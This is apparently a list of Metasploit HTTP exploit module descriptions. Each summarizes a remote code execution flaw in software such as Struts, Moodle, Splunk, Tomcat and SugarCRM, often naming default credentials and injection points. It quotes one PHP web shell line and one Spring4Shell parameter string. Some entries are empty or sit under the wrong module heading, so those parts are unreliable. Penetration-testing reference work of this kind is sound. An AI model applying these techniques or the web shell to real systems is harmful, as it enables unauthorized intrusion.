This module exploits an arbitrary file upload vulnerability in MaraCMS 7.5 and prior in order to execute arbitrary commands. The module first attempts to authenticate to MaraCMS. It then tries to upload a malicious PHP file to the web root via an HTTP POST request to `codebase/handler.php.` If the `php` target is selected, the payload is embedded in the uploaded file and the module attempts to execute the payload via an HTTP GET request to this file. For the `linux` and `windows` targets, the module uploads a simple PHP web shell similar to `<?php system($_GET["cmd"]); ?>`. Subsequently, it leverages the CmdStager mixin to deliver the final payload via a series of HTTP GET requests to the PHP web shell. Valid credentials for a MaraCMS `admin` or `manager` account are required. This module has been successfully tested against MaraCMS 7.5 running on Windows Server 2012 (XAMPP server).

multi/http/mediawiki_syntaxhighlight
This module exploits an option injection vulnerability in the SyntaxHighlight extension of MediaWiki. It tries to create & execute a PHP file in the document root. The USERNAME & PASSWORD options are only needed if the Wiki is configured as private. This vulnerability affects any MediaWiki installation with SyntaxHighlight version 2.0 installed & enabled. This extension ships with the AIO package of MediaWiki version 1.27.x & 1.28.x. A fix for this issue is included in MediaWiki version 1.28.2 and version 1.27.3.

multi/http/mediawiki_thumb
MediaWiki 1.22.x before 1.22.2, 1.21.x before 1.21.5 and 1.19.x before 1.19.11, when DjVu or PDF file upload support is enabled, allows remote unauthenticated users to execute arbitrary commands via shell metacharacters. If no target file is specified this module will attempt to log in with the provided credentials to upload a file (.DjVu) to use for exploitation.

multi/http/metasploit_static_secret_key_base
This module exploits the Web UI for Metasploit Community, Express and Pro where one of a certain set of Weekly Releases have been applied. These Weekly Releases introduced a static secret_key_base value. Knowledge of the static secret_key_base value allows for deserialization of a crafted Ruby Object, achieving code execution. This module is based on exploits/multi/http/rails_secret_deserialization

multi/http/metasploit_webui_console_command_execution
This module exploits the "diagnostic console" feature in the Metasploit Web UI to obtain a reverse shell. The diagnostic console is able to be enabled or disabled by an administrator on Metasploit Pro and by an authenticated user on Metasploit Express and Metasploit Community. When enabled, the diagnostic console provides access to msfconsole via the web interface. An authenticated user can then use the console to execute shell commands. NOTE: Valid credentials are required for this module. Tested against: Metasploit Community 4.1.0, Metasploit Community 4.8.2, Metasploit Community 4.12.0

multi/http/microfocus_obm_auth_rce
This module exploits an authenticated Java deserialization that affects a truckload of Micro Focus products: Operations Bridge Manager, Application Performance Management, Data Center Automation, Universal CMDB, Hybrid Cloud Management and Service Management Automation. However this module was only tested on Operations Bridge Manager. Exploiting this vulnerability will result in remote code execution as the root user on Linux or the SYSTEM user on Windows. Authentication is required, the module user needs to login to the application and obtain the authenticated LWSSO_COOKIE_KEY, which should be fed to the module. Any authenticated user can exploit this vulnerability, even the lowest privileged ones. For more information refer to the advisory link below.

multi/http/microfocus_ucmdb_unauth_deser
This module exploits two vulnerabilities, that when chained allow an attacker to achieve unauthenticated remote code execution in Micro Focus UCMDB. UCMDB included in versions 2020.05 and below of Operations Bridge Manager are affected, but this module can probably also be used to exploit Operations Bridge Manager (containerized) and Application Performance Management. Check the advisory and module documentation for details. The first vulnerability is a hardcoded password for the "diagnostics" user, which allows us to login to UCMDB. The second vulnerability is a run-of-the-mill Java deserialization, which can be exploited with ysoserial's CommonsBeanutils1 payload. Both Windows and Linux installations are vulnerable.

multi/http/mma_backdoor_upload
This module exploits Th3 MMA mma.php Backdoor which allows an arbitrary file upload that leads to arbitrary code execution. This backdoor also echoes the Linux kernel version or operating system version because of the php_uname() function.

multi/http/mobilecartly_upload_exec
This module exploits a vulnerability in MobileCartly. The savepage.php file does not do any permission checks before using file_put_contents(), which allows any user to have direct control of that function to create files under the 'pages' directory by default, or anywhere else as long as the user has WRITE permission.

multi/http/monitorr_webshell_rce_cve_2020_28871
This module exploits an arbitrary file upload vulnerability and achieving an RCE in the Monitorr application. Using a specially crafted request, custom PHP code can be uploaded and injected through endpoint upload.php because of missing input validation. Any user privileges can exploit this vulnerability and it results in access to the underlying operating system with the same privileges under which the web services run (typically user www-data). Monitorr 1.7.6m, 1.7.7d and below are affected.

multi/http/monstra_fileupload_exec
MonstraCMS 3.0.4 allows users to upload Arbitrary files which leads to remote command execution on the remote server. An attacker may choose to upload a file containing PHP code and run this code by accessing the resulting PHP file. This module was tested against MonstraCMS 3.0.4.

multi/http/moodle_admin_shell_upload
This module will generate a plugin which can receive a malicious payload request and upload it to a server running Moodle provided valid admin credentials are used. Then the payload is sent for execution, and the plugin uninstalled. You must have an admin account to exploit this vulnerability. Successfully tested against 3.6.3, 3.8.0, 3.9.0, 3.10.0, 3.11.2

multi/http/moodle_spelling_binary_rce
Moodle allows an authenticated user to define spellcheck settings via the web interface. The user can update the spellcheck mechanism to point to a system-installed aspell binary. By updating the path for the spellchecker to an arbitrary command, an attacker can run arbitrary commands in the context of the web application upon spellchecking requests. This module also allows an attacker to leverage another privilege escalation vuln. Using the referenced XSS vuln, an unprivileged authenticated user can steal an admin sesskey and use this to escalate privileges to that of an admin, allowing the module to pop a shell as a previously unprivileged authenticated user. This module was tested against Moodle version 2.5.2 and 2.2.3.

multi/http/moodle_spelling_path_rce
Moodle allows an authenticated administrator to define spellcheck settings via the web interface. An administrator can update the aspell path to include a command injection. This is extremely similar to CVE-2013-3630, just using a different variable. This module was tested against Moodle version 3.11.2, 3.10.0, and 3.8.0.

multi/http/moodle_teacher_enrollment_priv_esc_to_rce
Moodle version 3.9, 3.8 to 3.8.3, 3.7 to 3.7.6, 3.5 to 3.5.12 and earlier unsupported versions allow for a teacher to exploit chain to RCE. A bug in the privileges system allows a teacher to add themselves as a manager to their own class. They can then add any other users, and thus look to add someone with manager privileges on the system (not just the class). After adding a system manager, a 'loginas' feature is used to access their account. Next the system is reconfigured to allow for all users to install an addon/plugin. Then a malicious theme is uploaded and creates an RCE. If all of that is a success, we revert permissions for managers to system default and remove our malicoius theme. Manual cleanup to remove students from the class is required. This module was tested against Moodle version 3.9

multi/http/movabletype_upgrade_exec
This module can be used to execute a payload on MoveableType (MT) that exposes a CGI script, mt-upgrade.cgi (usually at /mt/mt-upgrade.cgi), that is used during installation and updating of the platform. The vulnerability arises due to the following properties: 1. This script may be invoked remotely without requiring authentication to any MT instance. 2. Through a crafted POST request, it is possible to invoke particular database migration functions (i.e. functions that bring the existing database up-to-date with an updated codebase) by name and with particular parameters. 3. A particular migration function, core_drop_meta_for_table, allows a class parameter to be set which is used directly in a perl eval statement, allowing perl code injection.

multi/http/mutiny_subnetmask_exec
This module exploits an authenticated command injection vulnerability in the Mutiny appliance. Versions prior to 4.5-1.12 are vulnerable. In order to exploit the vulnerability the mutiny user must have access to the admin interface. The injected commands are executed with root privileges. This module has been tested successfully on Mutiny 4.2-1.05.

multi/http/mybb_rce_cve_2022_24734
This exploit module leverages an improper input validation vulnerability in MyBB prior to `1.8.30` to execute arbitrary code in the context of the user running the application. MyBB Admin Control setting page calls PHP `eval` function with an unsanitized user input. The exploit adds a new setting, injecting the payload in the vulnerable field, and triggers its execution with a second request. Finally, it takes care of cleaning up and removes the setting. Note that authentication is required for this exploit to work and the account must have rights to add or update settings (typically, myBB administrator role).

multi/http/nas4free_php_exec
NAS4Free allows an authenticated user to post PHP code to a special HTTP script and have the code executed remotely. This module was successfully tested against NAS4Free version 9.1.0.1.804. Earlier builds are likely to be vulnerable as well.

multi/http/navigate_cms_rce
This module exploits insufficient sanitization in the database::protect method, of Navigate CMS versions 2.8 and prior, to bypass authentication. The module then uses a path traversal vulnerability in navigate_upload.php that allows authenticated users to upload PHP files to arbitrary locations. Together these vulnerabilities allow an unauthenticated attacker to execute arbitrary PHP code remotely. This module was tested against Navigate CMS 2.8.

multi/http/netwin_surgeftp_exec
This module exploits a vulnerability found in Netwin SurgeFTP, version 23c8 or prior. In order to execute commands via the FTP service, please note that you must have a valid credential to the web-based administrative console.

multi/http/nibbleblog_file_upload

By using this vulnerability it is possible to upload/execute a malicious Openfire plugin on the server and execute arbitrary Java code. This module has been tested against Openfire 3.6.0a. It is possible to remove the uploaded plugin after execution, however this might turn the server in some kind of unstable state, making re-exploitation difficult. You might want to do this manually.

multi/http/openfire_auth_bypass_rce_cve_2023_32315
Openfire is an XMPP server licensed under the Open Source Apache License. Openfire's administrative console, a web-based application, was found to be vulnerable to a path traversal attack via the setup environment. This permitted an unauthenticated user to use the unauthenticated Openfire Setup Environment in an already configured Openfire environment to access restricted pages in the Openfire Admin Console reserved for administrative users. This module will use the vulnerability to create a new admin user that will be used to upload a Openfire management plugin weaponised with java native payload that triggers an RCE. This vulnerability affects all versions of Openfire that have been released since April 2015, starting with version 3.10.0. The problem has been patched in Openfire release 4.7.5 and 4.6.8, and further improvements will be included in the first version on the 4.8 branch, which is version 4.8.0.

This module logs at most 2 events in the application log of papercut. Each event is tied to modifcation of server settings.

multi/http/pentaho_business_server_authbypass_and_ssti
Hitachi Vantara Pentaho Business Analytics Server prior to versions 9.4.0.1 and 9.3.0.2, including 8.3.x is vulnerable to an authentication bypass (CVE-2022-43939) and a Server Side Template Injection (SSTI) vulnerability (CVE-2022-43769) that can be chained together to achieve unauthenticated code execution as the user running the Pentaho Business Analytics Server. The first vulnerability (CVE-2022-43939) is an authentication bypass which stems from a regex that allows any URL that ends in "/", followed by "require", optionally "-js" or "-cfg", any character, and then the string "js" followed optionally by "?" and then any characters of the attacker's choice. The second (CVE-2022-43769) is a server side template injection. This vulnerability allows RCE by making a GET request to /api/ldap/config/ldapTreeNodeChildren and setting the url parameter to ThymeLeaf template code. By abusing the ability to execute arbitrary Java classes within Thymeleaf templates, an attacker can execute arbitrary commands as the user running the Pentaho Business Analytics Server.

multi/http/phoenix_exec
This module exploits a Remote Code Execution in the web panel of Phoenix Exploit Kit via geoip.php. The Phoenix Exploit Kit is a popular commercial crimeware tool that probes the browser of the visitor for the presence of outdated and insecure versions of browser plugins like Java and Adobe Flash and Reader, silently installing malware if found.

multi/http/php_cgi_arg_injection
When run as a CGI, PHP up to version 5.3.12 and 5.4.2 is vulnerable to an argument injection vulnerability. This module takes advantage of the -d flag to set php.ini directives to achieve code execution. From the advisory: "if there is NO unescaped '=' in the query string, the string is split on '+' (encoded space) characters, urldecoded, passed to a function that escapes shell metacharacters (the "encoded in a system-defined manner" from the RFC) and then passes them to the CGI binary." This module can also be used to exploit the plesk 0day disclosed by kingcope and exploited in the wild on June 2013.

multi/http/php_fpm_rce
This module exploits an underflow vulnerability in versions 7.1.x below 7.1.33, 7.2.x below 7.2.24 and 7.3.x below 7.3.11 of PHP-FPM on Nginx. Only servers with certains Nginx + PHP-FPM configurations are exploitable. This is a port of the original neex's exploit code (see refs.). First, it detects the correct parameters (Query String Length and custom header length) needed to trigger code execution. This step determines if the target is actually vulnerable (Check method). Then, the exploit sets a series of PHP INI directives to create a file locally on the target, which enables code execution through a query string parameter. This is used to execute normal payload stagers. Finally, this module does some cleanup by killing local PHP-FPM workers (those are spawned automatically once killed) and removing the created local file.

multi/http/php_utility_belt_rce
This module exploits a remote code execution vulnerability in PHP Utility Belt, which is a set of tools for PHP developers and should not be installed in a production environment, since this application runs arbitrary PHP code as an intended functionality.

multi/http/playsms_template_injection
This module exploits a preauth Server-Side Template Injection vulnerability that leads to remote code execution in PlaySMS before version 1.4.3. This issue is caused by double processing a server-side template with a custom PHP template system called 'TPL' which is used in the PlaySMS template engine at `src/Playsms/Tpl.php:_compile()`. The vulnerability is triggered when an attacker supplied username with a malicious payload is submitted. This malicious payload is then stored in a TPL template which when rendered a second time, results in code execution. The TPL(https://github.com/antonraharja/tpl) template language is vulnerable to PHP code injection. This module was tested against PlaySMS 1.4 on HackTheBox's Forlic Machine.

multi/http/playsms_uploadcsv_exec
This module exploits an authenticated file upload remote code excution vulnerability in PlaySMS Version 1.4. This issue is caused by improper file contents handling in import.php (aka the Phonebook import feature).

multi/http/rails_actionpack_inline_exec
This module exploits a remote code execution vulnerability in the inline request processor of the Ruby on Rails ActionPack component. This vulnerability allows an attacker to process ERB to the inline JSON processor, which is then rendered, permitting full RCE within the runtime, without logging an error condition.

multi/http/rails_double_tap
This module exploits a vulnerability in Ruby on Rails. In development mode, a Rails application would use its name as the secret_key_base, and can be easily extracted by visiting an invalid resource for a path. As a result, this allows a remote user to create and deliver a signed serialized payload, load it by the application, and gain remote code execution.

multi/http/rails_dynamic_render_code_exec
This module exploits a remote code execution vulnerability in the explicit render method when leveraging user parameters. This module has been tested across multiple versions of Ruby on Rails. The technique used by this module requires the specified endpoint to be using dynamic render paths, such as the following example: def show render params[:id] end Also, the vulnerable target will need a POST endpoint for the TempFile upload, this can literally be any endpoint. This module doesnt use the log inclusion method of exploitation due to it not being universal enough. Instead, a new code injection technique was found and used whereby an attacker can upload temporary image files against any POST endpoint and use them for the inclusion attack. Finally, you only get one shot at this if you are testing with the builtin rails server, use caution.

multi/http/rails_json_yaml_code_exec
This module exploits a remote code execution vulnerability in the JSON request processor of the Ruby on Rails application framework. This vulnerability allows an attacker to instantiate a remote object, which in turn can be used to execute any ruby code remotely in the context of the application. This vulnerability is very similar to CVE-2013-0156. This module has been tested successfully on RoR 3.0.9, 3.0.19, and 2.3.15. The technique used by this module requires the target to be running a fairly recent version of Ruby 1.9 (since 2011 or so). Applications using Ruby 1.8 may still be exploitable using the init_with() method, but this has not been demonstrated.

multi/http/rails_secret_deserialization
This module implements Remote Command Execution on Ruby on Rails applications. Prerequisite is knowledge of the "secret_token" (Rails 2/3) or "secret_key_base" (Rails 4). The values for those can be usually found in the file "RAILS_ROOT/config/initializers/secret_token.rb". The module achieves RCE by deserialization of a crafted Ruby Object.

multi/http/rails_web_console_v2_code_exec

multi/http/rudder_server_sqli_rce
This Metasploit module exploits a SQL injection vulnerability in RudderStack's rudder-server, an open source Customer Data Platform (CDP). The vulnerability exists in versions of rudder-server prior to 1.3.0-rc.1. By exploiting this flaw, an attacker can execute arbitrary SQL commands, which may lead to Remote Code Execution (RCE) due to the `rudder` role in PostgreSQL having superuser permissions by default.

multi/http/sflog_upload_exec
This module exploits multiple design flaws in Sflog 1.0. By default, the CMS has a default admin credential of "admin:secret", which can be abused to access administrative features such as blogs management. Through the management interface, we can upload a backdoor that's accessible by any remote user, and then gain arbitrary code execution.

multi/http/shiro_rememberme_v124_deserialize
This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Apache Shiro v1.2.4. Note that other versions of Apache Shiro may also be exploitable if the encryption key used by Shiro to encrypt rememberMe cookies is known.

multi/http/shopware_createinstancefromnamedarguments_rce
This module exploits a php object instantiation vulnerability that can lead to RCE in Shopware. An authenticated backend user could exploit the vulnerability. The vulnerability exists in the createInstanceFromNamedArguments function, where the code insufficiently performs whitelist check which can be bypassed to trigger an object injection. An attacker can leverage this to deserialize an arbitrary payload and write a webshell to the target system, resulting in remote code execution. Tested on Shopware git branches 5.6, 5.5, 5.4, 5.3.

multi/http/simple_backdoors_exec
This module exploits unauthenticated simple web backdoor shells by leveraging the common backdoor shell's vulnerable parameter to execute commands. The SecLists project of Daniel Miessler and Jason Haddix has a lot of samples for these kind of backdoor shells which is categorized under Payloads.

multi/http/sit_file_upload
This module combines two separate issues within Support Incident Tracker (<= 3.65) application to upload arbitrary data and thus execute a shell. The two issues exist in ftp_upload_file.php. The first vulnerability exposes the upload dir used to store attachments. The second vulnerability allows arbitrary file upload since there is no validation function to prevent from uploading any file type. Authentication is required to exploit both vulnerabilities.

multi/http/snortreport_exec
This module exploits an arbitrary command execution vulnerability in nmap.php and nbtscan.php scripts.

multi/http/solarwinds_store_manager_auth_filter

This module has been tested successfully in Solarwinds Store Manager Server 5.1.0 and 5.7.1 on Windows 32 bits, Windows 64 bits and Linux 64 bits operating systems.

multi/http/solr_velocity_rce
This module exploits a vulnerability in Apache Solr <= 8.3.0 which allows remote code execution via a custom Velocity template. Currently, this module only supports Solr basic authentication. From the Tenable advisory: An attacker could target a vulnerable Apache Solr instance by first identifying a list of Solr core names. Once the core names have been identified, an attacker can send a specially crafted HTTP POST request to the Config API to toggle the params resource loader value for the Velocity Response Writer in the solrconfig.xml file to true. Enabling this parameter would allow an attacker to use the Velocity template parameter in a specially crafted Solr request, leading to RCE.

multi/http/sonicwall_gms_upload
This module exploits a code execution flaw in SonicWALL GMS. It exploits two vulnerabilities in order to get its objective. An authentication bypass in the Web Administration interface allows to abuse the "appliance" application and upload an arbitrary payload embedded in a JSP. The module has been tested successfully on SonicWALL GMS 6.0.6017 over Windows 2003 SP2 and SonicWALL GMS 6.0.6022 Virtual Appliance (Linux). On the Virtual Appliance the linux meterpreter hasn't run successfully while testing, shell payload has been used.

multi/http/sonicwall_scrutinizer_methoddetail_sqli
This module exploits a vulnerability found in Dell SonicWALL Scrutinizer. The methodDetail parameter in exporters.php allows an attacker to write arbitrary files to the file system with an SQL Injection attack, and gain remote code execution under the context of SYSTEM for Windows, or as Apache for Linux. Authentication is required to exploit this vulnerability, but this module uses the default admin:admin credential.

multi/http/sonicwall_shell_injection_cve_2023_34124
This module exploits a series of vulnerabilities - including auth bypass, SQL injection, and shell injection - to obtain remote code execution on SonicWall GMS versions <= 9.9.9320.

multi/http/splunk_mappy_exec
This module abuses a command execution vulnerability in the web based interface of Splunk 4.2 to 4.2.4. The vulnerability exists in the 'mappy' search command which allows attackers to run Python code. To exploit this vulnerability, a valid Splunk user with the admin role is required. By default, this module uses the credential of "admin:changeme", the default Administrator credential for Splunk. Note that the Splunk web interface runs as SYSTEM on Windows and as root on Linux by default.

multi/http/splunk_privilege_escalation_cve_2023_32707
A low-privileged user who holds a role that has the "edit_user" capability assigned to it can escalate their privileges to that of the admin user by providing a specially crafted web request. This is because the "edit_user" capability does not honor the "grantableRoles" setting in the authorize.conf configuration file, which prevents this scenario from happening. This exploit abuses this vulnerability to change the admin password and login with it to upload a malicious app achieving RCE.

multi/http/splunk_upload_app_exec
This module exploits a feature of Splunk whereby a custom application can be uploaded through the web based interface. Through the 'script' search command a user can call commands defined in their custom application which includes arbitrary perl or python code. To abuse this behavior, a valid Splunk user with the admin role is required. By default, this module uses the credential of "admin:changeme", the default Administrator credential for Splunk. Note that the Splunk web interface runs as SYSTEM on Windows, or as root on Linux by default. This module has been tested successfully against Splunk 5.0, 6.1, 6.1.1 and 7.2.4. Version 7.2.4 has been tested successfully against OSX as well

multi/http/spring_cloud_function_spel_injection
Spring Cloud Function versions prior to 3.1.7 and 3.2.3 are vulnerable to remote code execution due to using an unsafe evaluation context with user-provided queries. By crafting a request to the application and setting the spring.cloud.function.routing-expression header, an unauthenticated attacker can gain remote code execution. Both patched and unpatched servers will respond with a 500 server error and a JSON encoded message.

multi/http/spring_framework_rce_spring4shell
Spring Framework versions 5.3.0 to 5.3.17, 5.2.0 to 5.2.19, and older versions when running on JDK 9 or above and specifically packaged as a traditional WAR and deployed in a standalone Tomcat instance are vulnerable to remote code execution due to an unsafe data binding used to populate an object from request parameters to set a Tomcat specific ClassLoader. By crafting a request to the application and referencing the org.apache.catalina.valves.AccessLogValve class through the classLoader with parameters such as the following: class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp, an unauthenticated attacker can gain remote code execution.

multi/http/struts2_code_exec_showcase
This module exploits a remote code execution vulnerability in the Struts Showcase app in the Struts 1 plugin example in Struts 2.3.x series. Remote Code Execution can be performed via a malicious field value.

multi/http/struts2_content_type_ognl
This module exploits a remote code execution vulnerability in Apache Struts version 2.3.5 - 2.3.31, and 2.5 - 2.5.10. Remote Code Execution can be performed via http Content-Type header. Native payloads will be converted to executables and dropped in the server's temp dir. If this fails, try a cmd/* payload, which won't have to write to the disk.

multi/http/struts2_multi_eval_ognl
The Apache Struts framework, when forced, performs double evaluation of attributes' values assigned to certain tags attributes such as id. It is therefore possible to pass in a value to Struts that will be evaluated again when a tag's attributes are rendered. With a carefully crafted request, this can lead to Remote Code Execution (RCE). This vulnerability is application dependant. A server side template must make an affected use of request data to render an HTML tag attribute.

multi/http/struts2_namespace_ognl
This module exploits a remote code execution vulnerability in Apache Struts version 2.3 - 2.3.4, and 2.5 - 2.5.16. Remote Code Execution can be performed via an endpoint that makes use of a redirect action. Note that this exploit is dependant on the version of Tomcat running on the target. Versions of Tomcat starting with 7.0.88 currently don't support payloads larger than ~7.5kb. Windows Meterpreter sessions on Tomcat >=7.0.88 are currently not supported. Native payloads will be converted to executables and dropped in the server's temp dir. If this fails, try a cmd/* payload, which won't have to write to the disk.

multi/http/struts2_rest_xstream
Apache Struts versions 2.1.2 - 2.3.33 and Struts 2.5 - Struts 2.5.12, using the REST plugin, are vulnerable to a Java deserialization attack in the XStream library.

multi/http/struts_code_exec
This module exploits a remote command execution vulnerability in Apache Struts versions < 2.2.0. This issue is caused by a failure to properly handle unicode characters in OGNL extensive expressions passed to the web server. By sending a specially crafted request to the Struts application it is possible to bypass the "#" restriction on ParameterInterceptors by using OGNL context variables. Bypassing this restriction allows for the execution of arbitrary Java code.

multi/http/struts_code_exec_classloader
This module exploits a remote command execution vulnerability in Apache Struts versions 1.x (<= 1.3.10) and 2.x (< 2.3.16.2). In Struts 1.x the problem is related with the ActionForm bean population mechanism while in case of Struts 2.x the vulnerability is due to the ParametersInterceptor. Both allow access to 'class' parameter that is directly mapped to getClass() method and allows ClassLoader manipulation. As a result, this can allow remote attackers to execute arbitrary Java code via crafted parameters.

multi/http/struts_code_exec_exception_delegator
This module exploits a remote command execution vulnerability in Apache Struts versions < 2.2.1.1. This issue is caused because the ExceptionDelegator interprets parameter values as OGNL expressions during certain exception handling for mismatched data types of properties, which allows remote attackers to execute arbitrary Java code via a crafted parameter.

multi/http/struts_code_exec_parameters
This module exploits a remote command execution vulnerability in Apache Struts versions < 2.3.1.2. This issue is caused because the ParametersInterceptor allows for the use of parentheses which in turn allows it to interpret parameter values as OGNL expressions during certain exception handling for mismatched data types of properties which allows remote attackers to execute arbitrary Java code via a crafted parameter.

multi/http/struts_default_action_mapper
The Struts 2 DefaultActionMapper supports a method for short-circuit navigation state changes by prefixing parameters with "action:" or "redirect:", followed by a desired navigational target expression. This mechanism was intended to help with attaching navigational information to buttons within forms. In Struts 2 before 2.3.15.1 the information following "action:", "redirect:" or "redirectAction:" is not properly sanitized. Since said information will be evaluated as OGNL expression against the value stack, this introduces the possibility to inject server side code.

multi/http/struts_dev_mode
This module exploits a remote command execution vulnerability in Apache Struts 2. The problem exists on applications running in developer mode, where the DebuggingInterceptor allows evaluation and execution of OGNL expressions, which allows remote attackers to execute arbitrary Java code. This module has been tested successfully on Struts 2.3.16, Tomcat 7 and Ubuntu 10.04.

multi/http/struts_dmi_exec
This module exploits a remote command execution vulnerability in Apache Struts version between 2.3.20 and 2.3.28 (except 2.3.20.2 and 2.3.24.2). Remote Code Execution can be performed via method: prefix when Dynamic Method Invocation is enabled.

multi/http/struts_dmi_rest_exec
This module exploits a remote command execution vulnerability in Apache Struts version between 2.3.20 and 2.3.28 (except 2.3.20.2 and 2.3.24.2). Remote Code Execution can be performed when using REST Plugin with ! operator when Dynamic Method Invocation is enabled.

multi/http/struts_include_params
This module exploits a remote command execution vulnerability in Apache Struts versions < 2.3.14.2. A specifically crafted request parameter can be used to inject arbitrary OGNL code into the stack bypassing Struts and OGNL library protections. When targeting an action which requires interaction through GET, the payload should be split, taking into account the URI limits. In this case, if the rendered JSP has more than one point of injection, it could result in payload corruption. This should happen only when the payload is larger than the URI length.

multi/http/stunshell_eval
This module exploits unauthenticated versions of the "STUNSHELL" web shell. This module works when safe mode is enabled on the web server. This shell is widely used in automated RFI payloads.

multi/http/stunshell_exec
This module exploits unauthenticated versions of the "STUNSHELL" web shell. This module works when safe mode is disabled on the web server. This shell is widely used in automated RFI payloads.

multi/http/subrion_cms_file_upload_rce
This module exploits an authenticated file upload vulnerability in Subrion CMS versions 4.2.1 and lower. The vulnerability is caused by the .htaccess file not preventing the execution of .pht, .phar, and .xhtml files. Files with these extensions are not included in the .htaccess blacklist, hence these files can be uploaded and executed to achieve remote code execution. In this module, a .phar file with a randomized name is uploaded and executed to receive a Meterpreter session on the target, then deletes itself afterwards.

multi/http/sugarcrm_webshell_cve_2023_22952
This module exploits CVE-2023-22952, a Remote Code Execution (RCE) vulnerability in SugarCRM 11.0 Enterprise, Professional, Sell, Serve, and Ultimate versions prior to 11.0.5 and SugarCRM 12.0 Enterprise, Sell, and Serve versions prior to 12.0.2. The vulnerability occurs due to a lack of appropriate validation when uploading a malicious PNG file with embedded PHP code to the /cache/images/ directory on the web server using the vulnerable endpoint /index.php?module=EmailTemplates&action=AttachFiles. Once uploaded to the server, depending on server configuration, the attacker can access the malicious PNG file via HTTP or HTTPS, thereby executing the malicious PHP code and gaining access to the system. This vulnerability does not require authentication because there is a missing authentication check in the loadUser() method in include/MVC/SugarApplication.php. After a failed login, the session does not get destroyed and hence the attacker can continue to send valid requests to the application. Because of this, any remote attacker, regardless of authentication, can exploit this vulnerability to gain access to the underlying operating system as the user that the web services are running as (typically www-data).

multi/http/sun_jsws_dav_options
This module exploits a buffer overflow in Sun Java Web Server prior to version 7 Update 8. By sending an "OPTIONS" request with an overly long path, attackers can execute arbitrary code. In order to reach the vulnerable code, the attacker must also specify the path to a directory with WebDAV enabled. This exploit was tested and confirmed to work on Windows XP SP3 without DEP. Versions for other platforms are vulnerable as well. The vulnerability was originally discovered and disclosed by Evgeny Legerov of Intevydis.

multi/http/sysaid_auth_file_upload
This module exploits a file upload vulnerability in SysAid Help Desk. The vulnerability exists in the ChangePhoto.jsp in the administrator portal, which does not correctly handle directory traversal sequences and does not enforce file extension restrictions. While an attacker needs an administrator account in order to leverage this vulnerability, there is a related Metasploit auxiliary module which can create this account under some circumstances. This module has been tested in SysAid v14.4 in both Linux and Windows.

multi/http/sysaid_rdslogs_file_upload
This module exploits a file upload vulnerability in SysAid Help Desk v14.3 and v14.4. The vulnerability exists in the RdsLogsEntry servlet which accepts unauthenticated file uploads and handles zip file contents in an insecure way. By combining both weaknesses, a remote attacker can accomplish remote code execution. Note that this will only work if the target is running Java 6 or 7 up to 7u25, as Java 7u40 and above introduces a protection against null byte injection in file names. This module has been tested successfully on version v14.3.12 b22 and v14.4.32 b25 in Linux. In theory this module also works on Windows, but SysAid seems to bundle Java 7u40 and above with the Windows package which prevents the vulnerability from being exploited.

multi/http/testlink_upload_exec
This module exploits a vulnerability in TestLink version 1.9.3 or prior. This application has an upload feature that allows any authenticated user to upload arbitrary files to the '/upload_area/nodes_hierarchy/' directory with a randomized file name. The file name can be retrieved from the database using SQL injection.

multi/http/tomcat_jsp_upload_bypass
This module uses a PUT request bypass to upload a jsp shell to a vulnerable Apache Tomcat configuration.

multi/http/tomcat_mgr_deploy
This module can be used to execute a payload on Apache Tomcat servers that have an exposed "manager" application. The payload is uploaded as a WAR archive containing a jsp application using a PUT request. The manager application can also be abused using /manager/html/upload, but that method is not implemented in this module. NOTE: The compatible payload sets vary based on the selected target. For example, you must select the Windows target to use native Windows payloads.

multi/http/tomcat_mgr_upload
This module can be used to execute a payload on Apache Tomcat servers that have an exposed "manager" application. The payload is uploaded as a WAR archive containing a jsp application using a POST request against the /manager/html/upload component. NOTE: The compatible payload sets vary based on the selected target. For example, you must select the Windows target to use native Windows payloads.

multi/http/torchserver_cve_2023_43654
The PyTorch model server contains multiple vulnerabilities that can be chained together to permit an unauthenticated remote attacker arbitrary Java code execution. The first vulnerability is that the management interface is bound to all IP addresses and not just the loop back interface as the documentation suggests. The second vulnerability (CVE-2023-43654) allows attackers with access to the management interface to register MAR model files from arbitrary servers. The third vulnerability is that when an MAR file is loaded, it can contain a YAML configuration file that when deserialized by snakeyaml, can lead to loading an arbitrary Java class.

multi/http/totaljs_cms_widget_exec
This module exploits a vulnerability in Total.js CMS. The issue is that a user with admin permission can embed a malicious JavaScript payload in a widget, which is evaluated server side, and gain remote code execution.

multi/http/traq_plugin_exec
This module exploits an arbitrary command execution vulnerability in Traq 2.0 to 2.3. It's in the admincp/common.php script. This function is called in each script located in the /admicp/ directory to make sure the user has admin rights. This is a broken authorization schema because the header() function doesn't stop the execution flow. This can be exploited by malicious users to execute admin functionality, e.g. execution of arbitrary PHP code leveraging of plugins.php functionality.

multi/http/trendmicro_threat_discovery_admin_sys_time_cmdi
This module exploits two vulnerabilities the Trend Micro Threat Discovery Appliance. The first is an authentication bypass vulnerability via a file delete in logoff.cgi which resets the admin password back to 'admin' upon a reboot (CVE-2016-7552). The second is a cmdi flaw using the timezone parameter in the admin_sys_time.cgi interface (CVE-2016-7547). Note: You have the option to use the authentication bypass or not since it requires that the server is rebooted. The password reset will render the authentication useless. Typically, if an administrator cant login, they will bounce the box. Therefore, this module performs a heartbeat request until the box is bounced and then attempts to login and to perform the command injection. This module has been tested on version 2.6.1062r1 of the appliance.

multi/http/ubiquiti_unifi_log4shell
The Ubiquiti UniFi Network Application versions 5.13.29 through 6.5.53 are affected by the Log4Shell vulnerability whereby a JNDI string can be sent to the server via the 'remember' field of a POST request to the /api/login endpoint that will cause the server to connect to the attacker and deserialize a malicious Java object. This results in OS command execution in the context of the server application. This module will start an LDAP server that the target will need to connect to.

multi/http/uptime_file_upload_1
This module exploits an arbitrary file upload vulnerability found within the Up.Time monitoring server 7.2 and below. A malicious entity can upload a PHP file into the webroot without authentication, leading to arbitrary code execution. Although the vendor fixed Up.Time to prevent this vulnerability, it was not properly mitigated. To exploit against a newer version of Up.Time (such as 7.4), please use exploits/multi/http/uptime_file_upload_2.

multi/http/uptime_file_upload_2
This module exploits a vulnerability found in Uptime version 7.4.0 and 7.5.0. The vulnerability began as a classic arbitrary file upload vulnerability in post2file.php, which can be exploited by exploits/multi/http/uptime_file_upload_1.rb, but it was mitigated by the vendor. Although the mitigation in place will prevent uptime_file_upload_1.rb from working, it can still be bypassed and gain privilege escalation, and allows the attacker to upload file again, and execute arbitrary commands.

multi/http/v0pcr3w_exec
This module exploits a lack of authentication in the shell developed by v0pCr3w and is widely reused in automated RFI payloads. This module takes advantage of the shell's various methods to execute commands.

